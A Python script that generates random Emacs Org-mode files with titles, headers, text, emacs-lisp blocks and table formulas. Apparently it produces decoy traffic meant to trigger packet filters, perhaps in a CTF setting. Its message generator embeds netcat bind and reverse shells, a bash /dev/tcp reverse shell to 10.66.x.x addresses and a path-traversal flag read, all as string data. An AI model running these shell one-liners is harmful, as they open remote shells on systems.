import random
import base64
import string
import os
import secrets

def generate_message():
    "returns a string that hopefully triggers some packet filtering"

    return random.choice([
        os.urandom(random.randint(4, 128)).hex(),
	base64.b64encode(os.urandom(random.randint(4, 128))).decode(),
  	'A' * random.randint(4, 16),
	'B' * random.randint(4, 16),
        f'cat ../{secrets.token_hex()}/flag.org',
        'Never gonna give you up, never gonna let you down',
      	'/bin/sh -c "/bin/{} -l -p {} -e /bin/sh"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535)),
	'/bin/sh -c "/bin/{} -e /bin/sh 10.66.{}.{} {}"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535), random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
	'/bin/bash -i >& /dev/tcp/10.66.{}.{}/{} 0>&1'.format(random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
    ])

def generate_options():
    toc = random.choice(['toc:nil', 'toc:t'])
    title = random.choice(['title:nil', 'title:t'])
    headlines = f"H:{random.randint(1, 8)}"
    tables = random.choice(['|:nil', '|:t'])
    num = random.choice(['num:nil', 'num:t', f'num:{random.randint(1, 8)}'])
    options = ' '.join(random.sample([toc, "'", "*", "-", "^", headlines, title, tables, num], random.randint(1, 5)))
    return f"""
#+TITLE: {generate_message()}
#+AUTHOR: {generate_message()}
#+OPTIONS: {options}
"""

def generate_header():
    r = ""
    for i in range(random.randint(1, 5)):
        r += "*" * (i + 1) + f" {generate_message()}\n"
    return r

def generate_text():
    ALPHABET = string.ascii_letters + " "
    return '\n'.join([''.join(random.choices(ALPHABET, k=random.randint(20, 50))) for i in range(random.randint(2, 10))]) + '\n\n'

def generate_lisp_expression(length, numberonly, i):
    if length == 1:
        options = [str(random.randint(-100, 100))]
        if numberonly and i > 1:
            options.append(f"${random.randint(1, i - 1)}")
        return random.choice(options)

    # TODO: more
    operators = ['+', '*', '-', '/']
    return f'({random.choice(operators)} {" ".join(generate_lisp_expression(length - 1, numberonly, i) for _ in range(random.randint(2, 5)))})'

def generate_code_block():
    return "#+BEGIN_SRC emacs-lisp\n" + '\n'.join(generate_lisp_expression(random.randint(1, 3), False, None) for i in range(random.randint(2, 10))) + "\n#+END_SRC\n"

def generate_calc_expression(length, numberonly, i):
    if length == 1:
        options = [str(random.randint(-100, 100))]
        if numberonly and i > 1:
            options.append(f"${random.randint(1, i - 1)}")
        return random.choice(options)

    operators = ['+', '*', '-', '/']

    left = generate_calc_expression(length - 1, numberonly, i)
    right = generate_calc_expression(length - 1, numberonly, i)
    if random.choice([True, False]):
        left = '(' + left + ')'
    if random.choice([True, False]):
        right = '(' + right + ')'

    return left + random.choice(operators) + right

def rand_alphnum_token(length):
    ALPHABET = string.ascii_letters + string.digits
    return ''.join(random.choice(ALPHABET) for i in range(length))

def generate_table_formula(i, numberonly):
    if random.choice([True, False]):
        return f"${i}=" + random.choice([rand_alphnum_token(random.randrange(0, 10)), generate_calc_expression(random.randint(1, 3), numberonly, i)])
    else:
        return f"${i}='" + generate_lisp_expression(random.randint(1, 3), numberonly, i) + (";N" if numberonly else "")

def rand_token(length):
    ALPHABET = string.ascii_letters + string.digits + '/%_ *$~[]{}()=#@z,;.<>'
    return ''.join(random.choice(ALPHABET) for i in range(length))
    
def generate_table():
    n = random.randint(2, 5)
    m = random.randint(3, 7)
    numberonly = random.choice([True, False])
    table = ""
    for i in range(m):
        table += '| '
        for j in range(n):
            if numberonly:
                table += str(random.randint(1, 500)).rjust(16, ' ')
            else:
                table += rand_token(random.randint(1, 16)).rjust(16, ' ')
            table += ' | '
        table += '\n'
    if random.choice([True, False]):
        maxformulas = n - 1
        it = random.sample(range(maxformulas), random.randint(1, maxformulas))
        table += "#+TBLFM:" + '::'.join(generate_table_formula(i + 1, numberonly) for i in it) + "\n"
    return table

def generate_org_file(length):
    if length == 0:
        return ''

    func = random.choice([generate_table, generate_text, generate_code_block])
    res = func() + '\n' * (random.randint(1, 5))
    if len(res) < 2000:
        res += generate_org_file(length - 1)
    return res

def generate_org_files():
    files = []
    for i in range(8):
        length = random.randint(3, 10)
        files.append(generate_options() + '\n' + generate_org_file(length))
    return files
